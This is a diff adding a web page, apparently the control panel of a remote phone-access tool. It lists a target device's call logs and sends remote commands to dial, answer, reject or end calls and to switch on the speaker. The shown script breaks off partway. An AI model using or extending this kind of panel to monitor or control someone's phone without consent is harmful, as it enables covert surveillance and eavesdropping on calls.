@@ -1,0 +1,1377 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Call Logs - Remote Access</title>
+    <link rel="stylesheet" href="/css/hacker-theme.css">
+    <link href="https://api.fontshare.com/v2/css?f[]=satoshi@400,500,700&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
+    <style>
+        :root {
+            --font-display: 'Satoshi', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            --font-mono: 'Satoshi', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+        }
+
+        body {
+            padding: 0;
+            min-height: 100vh;
+            font-family: var(--font-display) !important;
+        }
+
+        .wrap {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px 24px;
+            animation: fadeInUp 0.4s ease-out;
+        }
+
+        /* ── HEADER ── */
+        .pg-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 16px 22px;
+            background: var(--bg-panel);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            margin-bottom: 16px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .pg-header::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent 10%, var(--accent) 50%, transparent 90%);
+            opacity: 0.4;
+        }
+
+        .pg-header-left {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .pg-icon {
+            width: 42px;
+            height: 42px;
+            background: linear-gradient(135deg, rgba(0, 255, 65, 0.12), rgba(0, 255, 65, 0.04));
+            border: 1px solid rgba(0, 255, 65, 0.25);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--accent);
+            box-shadow: 0 0 16px rgba(0, 255, 65, 0.08);
+        }
+
+        .pg-title {
+            font-family: var(--font-display);
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: #e8e8e8;
+        }
+
+        .pg-title span {
+            color: var(--accent);
+            text-shadow: 0 0 12px rgba(0, 255, 65, 0.3);
+        }
+
+        .pg-sub {
+            font-family: var(--font-mono);
+            font-size: 0.6rem;
+            color: var(--text-muted);
+            letter-spacing: 1px;
+            margin-top: 1px;
+        }
+
+        .count-badge {
+            display: inline-block;
+            padding: 2px 10px;
+            border-radius: 20px;
+            font-family: var(--font-display);
+            font-size: 0.55rem;
+            font-weight: 600;
+            background: rgba(0, 255, 65, 0.1);
+            color: var(--accent);
+            border: 1px solid rgba(0, 255, 65, 0.2);
+            margin-left: 8px;
+            vertical-align: middle;
+        }
+
+        .hdr-actions {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+
+        .hdr-btn {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding: 7px 14px;
+            font-family: var(--font-display);
+            font-size: 0.7rem;
+            font-weight: 500;
+            text-decoration: none;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--border);
+            color: var(--text-secondary);
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .hdr-btn:hover {
+            color: var(--accent);
+            border-color: rgba(0, 255, 65, 0.25);
+            background: rgba(0, 255, 65, 0.04);
+        }
+
+        /* ── CALL BANNER ── */
+        .call-banner {
+            display: none;
+            padding: 14px 20px;
+            border-radius: 10px;
+            margin-bottom: 12px;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .call-banner.ringing {
+            display: flex;
+            background: rgba(255, 170, 0, 0.06);
+            border: 1px solid rgba(255, 170, 0, 0.2);
+            animation: bannerPulse 1.5s ease-in-out infinite;
+        }
+
+        .call-banner.active {
+            display: flex;
+            background: rgba(0, 255, 65, 0.04);
+            border: 1px solid rgba(0, 255, 65, 0.15);
+        }
+
+        @keyframes bannerPulse {
+
+            0%,
+            100% {
+                border-color: rgba(255, 170, 0, 0.2);
+            }
+
+            50% {
+                border-color: rgba(255, 170, 0, 0.5);
+            }
+        }
+
+        .call-banner .b-icon {
+            width: 42px;
+            height: 42px;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .call-banner.ringing .b-icon {
+            background: rgba(255, 170, 0, 0.1);
+            border: 1px solid rgba(255, 170, 0, 0.2);
+            color: var(--warning);
+        }
+
+        .call-banner.active .b-icon {
+            background: rgba(0, 255, 65, 0.1);
+            border: 1px solid rgba(0, 255, 65, 0.2);
+            color: var(--accent);
+        }
+
+        .call-banner .b-info {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .call-banner .b-label {
+            font-family: var(--font-display);
+            font-size: 0.6rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .call-banner.ringing .b-label {
+            color: var(--warning);
+        }
+
+        .call-banner.active .b-label {
+            color: var(--accent);
+        }
+
+        .call-banner .b-number {
+            font-family: var(--font-mono);
+            font-size: 0.85rem;
+            color: var(--text-primary);
+            margin-top: 2px;
+        }
+
+        .call-banner .b-acts {
+            display: flex;
+            gap: 6px;
+            flex-shrink: 0;
+        }
+
+        .cb-btn {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            padding: 7px 14px;
+            font-family: var(--font-display);
+            font-size: 0.6rem;
+            font-weight: 600;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.2s;
+            border: 1px solid;
+        }
+
+        .cb-btn.answer {
+            background: rgba(0, 255, 65, 0.1);
+            color: var(--accent);
+            border-color: rgba(0, 255, 65, 0.25);
+        }
+
+        .cb-btn.answer:hover {
+            background: rgba(0, 255, 65, 0.18);
+        }
+
+        .cb-btn.reject,
+        .cb-btn.end {
+            background: rgba(255, 51, 51, 0.08);
+            color: var(--danger);
+            border-color: rgba(255, 51, 51, 0.2);
+        }
+
+        .cb-btn.reject:hover,
+        .cb-btn.end:hover {
+            background: rgba(255, 51, 51, 0.15);
+        }
+
+        .cb-btn.speaker {
+            background: rgba(0, 170, 255, 0.08);
+            color: #0af;
+            border-color: rgba(0, 170, 255, 0.2);
+        }
+
+        .cb-btn.speaker:hover {
+            background: rgba(0, 170, 255, 0.15);
+        }
+
+        .cb-btn.speaker.on {
+            background: rgba(0, 170, 255, 0.18);
+            border-color: rgba(0, 170, 255, 0.4);
+        }
+
+        /* ── DIAL PANEL ── */
+        .dial-panel {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 16px 20px;
+            margin-bottom: 12px;
+        }
+
+        .dial-panel h3 {
+            font-family: var(--font-display);
+            font-size: 0.8rem;
+            font-weight: 600;
+            color: var(--text-secondary);
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .dial-row {
+            display: flex;
+            gap: 8px;
+        }
+
+        .dial-search-wrap {
+            position: relative;
+            flex: 1;
+        }
+
+        .dial-search-wrap input {
+            width: 100%;
+            padding: 10px 16px 10px 40px;
+            background: var(--bg-panel);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            color: var(--text-primary);
+            font-family: var(--font-mono);
+            font-size: 0.8rem;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .dial-search-wrap input:focus {
+            border-color: rgba(0, 255, 65, 0.3);
+        }
+
+        .dial-search-wrap input::placeholder {
+            color: var(--text-muted);
+        }
+
+        .dial-search-wrap .d-icon {
+            position: absolute;
+            left: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--text-muted);
+            pointer-events: none;
+        }
+
+        .btn-call {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding: 10px 20px;
+            background: rgba(0, 255, 65, 0.1);
+            border: 1px solid rgba(0, 255, 65, 0.25);
+            color: var(--accent);
+            border-radius: 8px;
+            cursor: pointer;
+            font-family: var(--font-display);
+            font-size: 0.75rem;
+            font-weight: 600;
+            transition: all 0.2s;
+            flex-shrink: 0;
+        }
+
+        .btn-call:hover {
+            background: rgba(0, 255, 65, 0.18);
+        }
+
+        .dial-hint {
+            font-family: var(--font-display);
+            font-size: 0.65rem;
+            color: var(--text-muted);
+            margin-top: 6px;
+            opacity: 0.7;
+        }
+
+        /* Suggestions dropdown */
+        .dial-suggestions {
+            position: absolute;
+            top: 100%;
+            left: 0;
+            right: 0;
+            background: var(--bg-panel);
+            border: 1px solid rgba(0, 255, 65, 0.2);
+            border-top: none;
+            border-radius: 0 0 8px 8px;
+            max-height: 220px;
+            overflow-y: auto;
+            z-index: 100;
+            display: none;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
+        }
+
+        .dial-suggestions.visible {
+            display: block;
+        }
+
+        .dial-suggestion {
+            padding: 10px 14px;
+            cursor: pointer;
+            border-bottom: 1px solid var(--border);
+            transition: background 0.12s;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .dial-suggestion:last-child {
+            border-bottom: none;
+        }
+
+        .dial-suggestion:hover,
+        .dial-suggestion.active {
+            background: rgba(0, 255, 65, 0.06);
+        }
+
+        .dial-suggestion .sug-name {
+            font-family: var(--font-display);
+            font-weight: 600;
+            color: var(--text-primary);
+            font-size: 0.8rem;
+        }
+
+        .dial-suggestion .sug-number {
+            font-family: var(--font-mono);
+            color: var(--accent);
+            font-size: 0.72rem;
+        }
+
+        .dial-suggestion .sug-only-number {
+            font-family: var(--font-mono);
+            color: var(--text-primary);
+            font-size: 0.8rem;
+        }
+
+        /* ── FILTER BAR ── */
+        .filter-bar {
+            display: none;
+            gap: 6px;
+            margin-bottom: 12px;
+            flex-wrap: wrap;
+        }
+
+        .filter-btn {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            padding: 6px 14px;
+            font-family: var(--font-display);
+            font-size: 0.65rem;
+            font-weight: 600;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--border);
+            color: var(--text-muted);
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .filter-btn:hover {
+            color: var(--text-secondary);
+            border-color: rgba(255, 255, 255, 0.12);
+        }
+
+        .filter-btn.active {
+            background: rgba(0, 255, 65, 0.08);
+            color: var(--accent);
+            border-color: rgba(0, 255, 65, 0.2);
+        }
+
+        .stats-bar {
+            font-family: var(--font-display);
+            font-size: 0.7rem;
+            color: var(--text-muted);
+            margin-bottom: 8px;
+        }
+
+        /* ── LOG TABLE ── */
+        .log-table-wrap {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            overflow: auto;
+            max-height: 70vh;
+        }
+
+        .log-table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        .log-table th,
+        .log-table td {
+            text-align: left;
+            padding: 10px 14px;
+            border-bottom: 1px solid var(--border);
+            font-size: 0.8rem;
+        }
+
+        .log-table th {
+            font-family: var(--font-display);
+            color: var(--accent);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            font-size: 0.65rem;
+            font-weight: 600;
+            background: var(--bg-panel);
+            position: sticky;
+            top: 0;
+            z-index: 10;
+        }
+
+        .log-table td {
+            color: var(--text-primary);
+            font-family: var(--font-display);
+        }
+
+        .log-table td .num {
+            font-family: var(--font-mono);
+            font-size: 0.7rem;
+            color: var(--text-muted);
+        }
+
+        .log-table td .name {
+            font-weight: 600;
+        }
+
+        .log-table tbody tr {
+            transition: background 0.15s;
+        }
+
+        .log-table tbody tr:nth-child(even) {
+            background: rgba(0, 255, 65, 0.01);
+        }
+
+        .log-table tbody tr:hover {
+            background: rgba(0, 255, 65, 0.04);
+        }
+
+        .type-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 0.6rem;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+        }
+
+        .type-badge.incoming {
+            background: rgba(0, 170, 255, 0.08);
+            color: #0af;
+        }
+
+        .type-badge.outgoing {
+            background: rgba(0, 255, 65, 0.08);
+            color: var(--accent);
+        }
+
+        .type-badge.missed {
+            background: rgba(255, 51, 51, 0.08);
+            color: var(--danger);
+        }
+
+        .type-badge.other {
+            background: rgba(255, 255, 255, 0.04);
+            color: var(--text-muted);
+        }
+
+        .btn-del-log {
+            background: rgba(255, 51, 51, 0.06);
+            border: 1px solid rgba(255, 51, 51, 0.12);
+            color: var(--danger);
+            padding: 4px 8px;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.15s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .btn-del-log:hover {
+            background: rgba(255, 51, 51, 0.15);
+        }
+
+        /* ── PAGINATION ── */
+        .pag {
+            display: none;
+            align-items: center;
+            justify-content: center;
+            gap: 16px;
+            margin-top: 12px;
+            padding: 12px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+        }
+
+        .pag button {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            padding: 6px 14px;
+            font-family: var(--font-display);
+            font-size: 0.65rem;
+            font-weight: 600;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--border);
+            color: var(--text-secondary);
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .pag button:hover:not(:disabled) {
+            color: var(--accent);
+            border-color: rgba(0, 255, 65, 0.25);
+        }
+
+        .pag button:disabled {
+            opacity: 0.3;
+            cursor: not-allowed;
+        }
+
+        .pag .pg-inf {
+            font-family: var(--font-mono);
+            font-size: 0.65rem;
+            color: var(--text-muted);
+        }
+
+        /* ── EMPTY ── */
+        .empty {
+            text-align: center;
+            padding: 60px 24px;
+            color: var(--text-muted);
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+        }
+
+        .empty .e-icon {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 14px;
+            opacity: 0.3;
+        }
+
+        .empty h2 {
+            font-family: var(--font-display);
+            font-size: 1rem;
+            font-weight: 600;
+            color: var(--text-secondary);
+            margin-bottom: 6px;
+        }
+
+        .empty p {
+            font-family: var(--font-display);
+            font-size: 0.7rem;
+        }
+
+        .pulse-load {
+            animation: pLoad 1.5s ease-in-out infinite;
+        }
+
+        @keyframes pLoad {
+
+            0%,
+            100% {
+                opacity: 0.3;
+            }
+
+            50% {
+                opacity: 1;
+            }
+        }
+
+        /* ── DISCLAIMER ── */
+        .disc {
+            margin-top: 28px;
+            padding: 16px 20px;
+            background: rgba(255, 170, 0, 0.03);
+            border: 1px solid rgba(255, 170, 0, 0.1);
+            border-radius: 10px;
+        }
+
+        .disc h4 {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-family: var(--font-display);
+            font-size: 0.7rem;
+            font-weight: 600;
+            color: var(--warning);
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            margin-bottom: 6px;
+        }
+
+        .disc p {
+            font-family: var(--font-display);
+            font-size: 0.65rem;
+            color: var(--text-muted);
+            line-height: 1.6;
+        }
+
+        /* ── FOOTER ── */
+        .ft {
+            text-align: center;
+            padding: 32px 16px;
+            margin-top: 28px;
+            border-top: 1px solid var(--border);
+        }
+
+        .ft .ft-label {
+            font-family: var(--font-display);
+            font-size: 0.6rem;
+            color: var(--text-muted);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-bottom: 6px;
+        }
+
+        .ft .ft-brand {
+            display: inline-block;
+            font-family: var(--font-display);
+            font-size: 1.3rem;
+            font-weight: 700;
+            letter-spacing: 3px;
+            text-transform: lowercase;
+            text-decoration: none;
+            background: linear-gradient(135deg, var(--accent), #00e5ff, var(--accent));
+            background-size: 200% 200%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            filter: drop-shadow(0 0 8px rgba(0, 255, 65, 0.2));
+            transition: all 0.4s ease;
+        }
+
+        .ft .ft-brand:hover {
+            filter: drop-shadow(0 0 16px rgba(0, 255, 65, 0.4));
+            animation: brandShine 1.5s ease infinite;
+        }
+
+        @keyframes brandShine {
+            0% {
+                background-position: 0% 50%;
+            }
+
+            50% {
+                background-position: 100% 50%;
+            }
+
+            100% {
+                background-position: 0% 50%;
+            }
+        }
+
+        .ft .ft-copy {
+            font-family: var(--font-mono);
+            font-size: 0.55rem;
+            color: var(--text-muted);
+            margin-top: 8px;
+            letter-spacing: 1px;
+        }
+
+        /* ===== RESPONSIVE ===== */
+        /* ── Tablets (1024px) ── */
+        @media (max-width: 1024px) {
+            .wrap {
+                padding: 14px 16px;
+            }
+
+            .log-table th,
+            .log-table td {
+                padding: 8px 10px;
+                font-size: 0.75rem;
+            }
+        }
+
+        /* ── Small tablets / Phablets (768px) ── */
+        @media (max-width: 768px) {
+            .wrap {
+                padding: 10px;
+            }
+
+            .pg-header {
+                padding: 12px 16px;
+                flex-wrap: wrap;
+                gap: 10px;
+            }
+
+            .pg-icon {
+                width: 36px;
+                height: 36px;
+            }
+
+            .pg-title {
+                font-size: 0.9rem;
+            }
+
+            .log-table th,
+            .log-table td {
+                padding: 8px 8px;
+                font-size: 0.72rem;
+            }
+
+            .call-banner {
+                flex-wrap: wrap;
+                gap: 10px;
+            }
+
+            .call-banner .b-acts {
+                width: 100%;
+            }
+
+            .cb-btn {
+                flex: 1;
+                justify-content: center;
+            }
+
+            .dial-row {
+                flex-direction: column;
+            }
+
+            .dial-search-wrap {
+                width: 100%;
+            }
+
+            .dial-search-wrap input {
+                width: 100%;
+                box-sizing: border-box;
+            }
+
+            .btn-call {
+                width: 100%;
+                justify-content: center;
+            }
+        }
+
+        /* ── Phones (480px) ── */
+        @media (max-width: 480px) {
+            .pg-sub {
+                display: none;
+            }
+
+            .hdr-btn .lbl {
+                display: none;
+            }
+
+            .dial-panel {
+                padding: 12px 14px;
+            }
+
+            .filter-btn {
+                font-size: 0.58rem;
+                padding: 5px 10px;
+            }
+
+            .log-table th,
+            .log-table td {
+                padding: 6px 4px;
+                font-size: 0.65rem;
+            }
+
+            .log-table th {
+                font-size: 0.55rem;
+            }
+
+            /* Hide date column on small screens to make room for delete */
+            .log-table th:nth-child(3),
+            .log-table td:nth-child(3) {
+                display: none;
+            }
+
+            .pag button {
+                padding: 6px 12px;
+                font-size: 0.6rem;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="wrap">
+
+        <!-- HEADER -->
+        <div class="pg-header">
+            <div class="pg-header-left">
+                <div class="pg-icon"><i data-lucide="phone" style="width:20px;height:20px;"></i></div>
+                <div>
+                    <div class="pg-title"><span>Call</span> Logs <span class="count-badge" id="log-count"
+                            style="display:none">0</span></div>
+                    <div class="pg-sub">// telephony records</div>
+                </div>
+            </div>
+            <div class="hdr-actions">
+                <button class="hdr-btn" onclick="exportLogs()"><i data-lucide="download"
+                        style="width:14px;height:14px;"></i><span class="lbl">Export CSV</span></button>
+                <a href="javascript:window.history.back()" class="hdr-btn"><i data-lucide="arrow-left"
+                        style="width:14px;height:14px;"></i><span class="lbl">Back</span></a>
+            </div>
+        </div>
+
+        <!-- LIVE CALL BANNER -->
+        <div id="call-banner" class="call-banner">
+            <div class="b-icon" id="call-icon"><i data-lucide="phone-incoming" style="width:20px;height:20px;"></i>
+            </div>
+            <div class="b-info">
+                <div class="b-label" id="call-label">INCOMING CALL</div>
+                <div class="b-number" id="call-number">Unknown</div>
+            </div>
+            <div class="b-acts" id="call-actions"></div>
+        </div>
+
+        <!-- DIAL PANEL -->
+        <div class="dial-panel">
+            <h3><i data-lucide="phone-outgoing" style="width:16px;height:16px;"></i> Dial Call</h3>
+            <div class="dial-row">
+                <div class="dial-search-wrap">
+                    <i data-lucide="search" class="d-icon" style="width:16px;height:16px;"></i>
+                    <input type="text" id="dial-input" placeholder="Search by name or number..." autocomplete="off">
+                    <div class="dial-suggestions" id="dial-suggestions"></div>
+                </div>
+                <button class="btn-call" onclick="dialNumber()"><i data-lucide="phone"
+                        style="width:14px;height:14px;"></i> Call</button>
+            </div>
+            <div class="dial-hint" id="dial-hint"></div>
+        </div>
+
+        <!-- FILTER BAR -->
+        <div class="filter-bar" id="filter-bar">
+            <button class="filter-btn active" data-type="ALL" onclick="filterType('ALL')"><i data-lucide="list"
+                    style="width:12px;height:12px;"></i> All</button>
+            <button class="filter-btn" data-type="INCOMING" onclick="filterType('INCOMING')"><i data-lucide="phone-incoming"
+                    style="width:12px;height:12px;"></i> Incoming</button>
+            <button class="filter-btn" data-type="OUTGOING" onclick="filterType('OUTGOING')"><i data-lucide="phone-outgoing"
+                    style="width:12px;height:12px;"></i> Outgoing</button>
+            <button class="filter-btn" data-type="MISSED" onclick="filterType('MISSED')"><i data-lucide="phone-missed"
+                    style="width:12px;height:12px;"></i> Missed</button>
+        </div>
+
+        <div class="stats-bar" id="stats"></div>
+
+        <!-- LOGS -->
+        <div id="logs-container">
+            <div class="empty">
+                <div class="e-icon pulse-load"><i data-lucide="phone" style="width:48px;height:48px;"></i></div>
+                <h2>Reading Call Logs</h2>
+                <p>Fetching from device...</p>
+            </div>
+        </div>
+
+        <!-- PAGINATION -->
+        <div id="pagination" class="pag" style="display:none">
+            <button id="prev-btn" onclick="prevPage()" disabled><i data-lucide="chevron-left"
+                    style="width:14px;height:14px;"></i> Prev</button>
+            <span class="pg-inf" id="page-info">Page 1</span>
+            <button id="next-btn" onclick="nextPage()">Next <i data-lucide="chevron-right"
+                    style="width:14px;height:14px;"></i></button>
+        </div>
+
+        <!-- DISCLAIMER -->
+        <div class="disc">
+            <h4><i data-lucide="alert-triangle" style="width:13px;height:13px;"></i> Disclaimer</h4>
+            <p>This application is intended for EDUCATIONAL AND PERSONAL USE ONLY. Installing or using this on a device
+                without the owner's explicit consent is illegal and unethical.</p>
+        </div>
+    </div>
+
+    <!-- FOOTER -->
+    <footer class="ft">
+        <div class="ft-label">crafted by</div>
+        <a href="https://thiyoplus-f.netlify.app/" target="_blank" class="ft-brand">thiyo-de</a>
+        <div class="ft-copy">&copy; 2025 &middot; all rights reserved</div>
+    </footer>
+
+    <script src="/js/api.js"></script>
+    <script src="/js/call-notification.js"></script>
+    <script>
+        lucide.createIcons();
+
+        // CALL-BUG-1: guard missing deviceId
+        const deviceId = new URLSearchParams(window.location.search).get('deviceId');
+        if (!deviceId) window.location.href = 'index.html';
+
+        // CALL-BUG-3: removed local escapeHtml — use global escHtml from api.js
+        let allLogs = [];
+        let activeFilter = 'ALL';
+        let hasMore = true;
+        let isLoading = false;
+        let currentPage = 1;
+        const PAGE_SIZE = 50;
+
+        // ========== CALL MANAGEMENT ==========
+        let callState = 'IDLE';
+        let callerNumber = null;
+        let callerName = null;
+        let speakerOn = false;
+        let callWs = null;
+
+        function connectCallWebSocket() {
+            var protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            callWs = new WebSocket(protocol + '//' + location.host + '/');
+            callWs.onopen = function () { callWs.send(JSON.stringify({ type: 'identify', role: 'browser' })); };
+            callWs.onmessage = function (event) {
+                try {
+                    var data = JSON.parse(event.data);
+                    if (data.type === 'call_state' && data.deviceId === deviceId) {
+                        callState = data.state || 'IDLE';
+                        callerNumber = data.number || null;
+                        callerName = data.contactName || null;
+                        updateCallBanner();
+                    }
+                } catch (e) { }
+            };
+            callWs.onclose = function () { setTimeout(connectCallWebSocket, 3000); };
+            callWs.onerror = function () { callWs.close(); };
+        }
+
+        function updateCallBanner() {
+            var banner = document.getElementById('call-banner');
+            var icon = document.getElementById('call-icon');
+            var label = document.getElementById('call-label');
+            var number = document.getElementById('call-number');
+            var actions = document.getElementById('call-actions');
+            banner.className = 'call-banner';
+
+            if (callState === 'RINGING') {
+                banner.classList.add('ringing');
+                icon.innerHTML = '<i data-lucide="phone-incoming" style="width:20px;height:20px;"></i>';
+                label.textContent = 'INCOMING CALL';
+                number.textContent = callerName ? callerName + ' (' + callerNumber + ')' : (callerNumber || 'Unknown');
+                actions.innerHTML =
+                    '<button class="cb-btn answer" onclick="answerCall()"><i data-lucide="phone" style="width:12px;height:12px;"></i> Answer</button>' +
+                    '<button class="cb-btn reject" onclick="rejectCall()"><i data-lucide="phone-off" style="width:12px;height:12px;"></i> Reject</button>';
+            } else if (callState === 'OFFHOOK') {
+                banner.classList.add('active');
+                icon.innerHTML = '<i data-lucide="phone-call" style="width:20px;height:20px;"></i>';
+                label.textContent = 'CALL ACTIVE';
+                number.textContent = callerName ? callerName + ' (' + callerNumber + ')' : (callerNumber || 'In Progress');
+                actions.innerHTML =
+                    '<button class="cb-btn speaker ' + (speakerOn ? 'on' : '') + '" onclick="toggleSpeaker()"><i data-lucide="volume-2" style="width:12px;height:12px;"></i> Speaker</button>' +
+                    '<button class="cb-btn end" onclick="endCall()"><i data-lucide="phone-off" style="width:12px;height:12px;"></i> End</button>';
+            } else {
+                speakerOn = false;
+                callerName = null;
+                actions.innerHTML = '';
+            }
+            lucide.createIcons();
+        }
+
+        // ========== DIAL SEARCH & AUTOCOMPLETE ==========
+        let selectedDialNumber = null;
+        let activeSuggestionIndex = -1;
+
+        function getUniqueContacts() {
+            var seen = {};
+            var contacts = [];
+            allLogs.forEach(function (log) {
+                var key = log.number;
+                if (!key || seen[key]) return;
+                seen[key] = true;
+                contacts.push({ name: log.name || '', number: log.number });
+            });
+            return contacts;
+        }
+
+        function updateDialSuggestions() {
+            var input = document.getElementById('dial-input');
+            var dropdown = document.getElementById('dial-suggestions');
+            var hint = document.getElementById('dial-hint');
+            var query = input.value.trim().toLowerCase();
+            activeSuggestionIndex = -1;
+
+            if (!query || query.length < 1) {
+                dropdown.classList.remove('visible');
+                dropdown.innerHTML = '';
+                if (!input.value.trim()) { selectedDialNumber = null; hint.textContent = ''; }
+                return;
+            }
+
+            var isPhoneNum = /^[\d+*#\s\-()]+$/.test(query);
+            var contacts = getUniqueContacts();
+            var matches = contacts.filter(function (c) {
+                return (c.name && c.name.toLowerCase().includes(query)) || (c.number && c.number.includes(query));
+            }).slice(0, 8);
+
+            if (matches.length === 0) {
+                dropdown.classList.remove('visible');
+                dropdown.innerHTML = '';
+                if (isPhoneNum) {
+                    selectedDialNumber = input.value.trim();
+                    hint.innerHTML = 'Will dial: <strong>' + escapeHtml(selectedDialNumber) + '</strong>';
+                } else {
+                    selectedDialNumber = null;
+                    hint.textContent = 'No matching contact found';
+                }
+                return;
+            }
+
+            var html = '';
+            matches.forEach(function (c, i) {
+                if (c.name) {
+                    html += '<div class="dial-suggestion" data-number="' + escapeHtml(c.number) + '" data-name="' + escapeHtml(c.name) + '" data-index="' + i + '">' +
+                        '<span class="sug-name">' + highlightMatch(c.name, query) + '</span>' +
+                        '<span class="sug-number">' + highlightMatch(c.number, query) + '</span></div>';
+                } else {
+                    html += '<div class="dial-suggestion" data-number="' + escapeHtml(c.number) + '" data-name="" data-index="' + i + '">' +
+                        '<span class="sug-only-number">' + highlightMatch(c.number, query) + '</span></div>';
+                }
+            });
+            dropdown.innerHTML = html;
+            dropdown.classList.add('visible');
+            dropdown.querySelectorAll('.dial-suggestion').forEach(function (el) {
+                el.addEventListener('click', function () { selectSuggestion(el.dataset.number, el.dataset.name); });
+            });
+        }
+
+        function highlightMatch(text, query) {
+            if (!text) return '';
+            var idx = text.toLowerCase().indexOf(query.toLowerCase());
+            if (idx === -1) return escapeHtml(text);
+            return escapeHtml(text.substring(0, idx)) + '<strong style="color:var(--accent)">' + escapeHtml(text.substring(idx, idx + query.length)) + '</strong>' + escapeHtml(text.substring(idx + query.length));
+        }
+
+        function selectSuggestion(number, name) {
+            var input = document.getElementById('dial-input');
+            var dropdown = document.getElementById('dial-suggestions');
+            var hint = document.getElementById('dial-hint');
+            selectedDialNumber = number;
+            input.value = name ? name + ' (' + number + ')' : number;
+            dropdown.classList.remove('visible');
+            dropdown.innerHTML = '';
+            hint.innerHTML = 'Will dial: <strong>' + escapeHtml(number) + '</strong>' + (name ? ' (' + escapeHtml(name) + ')' : '');
+        }
+
+        async function dialNumber() {
+            var input = document.getElementById('dial-input');
+            var rawValue = input.value.trim();
+            if (!rawValue) { api.showToast('Enter a phone number or search by name', 'error'); return; }
+            var numberToDial = selectedDialNumber;
+            if (!numberToDial) {
+                if (/^[\d+*#\s\-()]+$/.test(rawValue)) { numberToDial = rawValue; }
+                else {
+                    var match = getUniqueContacts().find(function (c) { return c.name && c.name.toLowerCase() === rawValue.toLowerCase(); });
+                    if (match) { numberToDial = match.number; }
+                    else { api.showToast('Not a valid phone number. Select a contact.', 'error'); return; }
+                }
+            }
+            try {
+                await api.sendCommand(deviceId, 'call_dial', { number: numberToDial });
+                api.showToast('Dialing ' + numberToDial, 'success');
+                input.value = ''; selectedDialNumber = null; document.getElementById('dial-hint').textContent = '';
+            } catch (e) { api.showToast('Dial failed: ' + e.message, 'error'); }
+        }
+
+        async function answerCall() { try { await api.sendCommand(deviceId, 'call_answer'); api.showToast('Answering...', 'success'); } catch (e) { api.showToast('Failed: ' + e.message, 'error'); } }
+        async function rejectCall() { try { await api.sendCommand(deviceId, 'call_end'); api.showToast('Call rejected', 'success'); } catch (e) { api.showToast('Failed: ' + e.message, 'error'); } }
+        async function endCall() { try { await api.sendCommand(deviceId, 'call_end'); api.showToast('Call ended', 'success'); } catch (e) { api.showToast('Failed: ' + e.message, 'error'); } }
+        async function toggleSpeaker() {
+            speakerOn = !speakerOn;
+            try { await api.sendCommand(deviceId, 'call_speaker', { on: speakerOn }); updateCallBanner(); api.showToast('Speaker ' + (speakerOn ? 'ON' : 'OFF'), 'success'); }
+            catch (e) { speakerOn = !speakerOn; api.showToast('Failed: ' + e.message, 'error'); }
+        }
+
+        // ========== DIAL INPUT EVENTS ==========
+        var dialInput = document.getElementById('dial-input');
+        dialInput.addEventListener('input', function () { selectedDialNumber = null; updateDialSuggestions(); });
